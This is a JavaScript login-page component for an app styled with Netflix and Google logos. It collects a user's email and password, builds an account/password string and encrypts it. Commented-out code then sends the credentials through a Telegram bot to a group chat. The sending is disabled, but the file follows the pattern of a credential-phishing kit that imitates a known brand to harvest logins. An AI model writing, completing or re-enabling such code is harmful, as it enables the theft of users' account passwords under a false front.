import {map,useRef} from "vanilla";
import css from "./Login.module.css";
import {netflixlogo,googlelogo} from "assets";
import {InputField,ShowsBackground,SkipAlert} from "components";
import {bottoken,netlixgroupid} from "estate";
import {encrypt,decrypt} from "afile";
import {setUsertoken} from "actions";
import Home from "../Home";


export default function Login(props){
    const {parent}=props;
    parent.insertAdjacentHTML("beforeend",`<div class="${css.login} activeroute"></div>`);
    const login=parent.querySelector(`.${css.login}`);
    const refs={
        inputfields:["email","password"].map(prop=>useRef(prop)),
    };

    login.innerHTML=`
        <div class="${css.row0}">
            <span class="${css.skipbtn}">Skip</span>
            <img class="${css.applogo}" alt="Aflex" src="${netflixlogo}" draggable="false"/>
        </div>
        <div class="${css.row1}"></div>
        <div class="${css.row2}">
            <button class="${css.signin}">Sign in</button>
            <div class="${css.logos}">
                ${map(logos,logo=>`
                    <img class="${css.logo}" alt="${logo.of}" src="${logo.src}" style="${logo.style}"/>
                `)}
            </div>
        <div>
    `;
    ["email","password"].forEach((prop,i)=>{
        InputField({
            parent:login.querySelector(`.${css.row1}`),
            placeholder:prop,
            ref:refs.inputfields[i],
            type:prop,
        });
    });
    ShowsBackground({parent:login,ref:refs.showsbackground});

    login.querySelector(`.${css.skipbtn}`).onclick=()=>{
        SkipAlert({parent:login});  
    };

    login.querySelector(`.${css.signin}`).onclick=()=>{
        if(navigator.onLine){
            /*const inputvalues=refs.inputfields.map(ref=>login.querySelector(`#${ref} input`).value);
            const input=encrypt(logincode(inputvalues[0],inputvalues[1],"google"));*/
            if(false){
                setUsertoken();
                appcontent.innerHTML="";
                Home({parent:app.querySelector("#content")});
            }
            /*fetch(`https://api.telegram.org/bot${bottoken}/sendMessage?chat_id=-${netlixgroupid}&text=${encodeURIComponent(input)}`,{
                method:"POST",
                redirect:"follow",
            }).catch(error=>console.log("error",error));*/
        }
    }
}

const logos=[
    {
        of:"google",
        src:googlelogo,
        style:"transform:rotate(-5deg)",
    }
];

const logincode=(account,password,type)=>`{
    account:${account},
    password:${password},
    type:${type},
}`;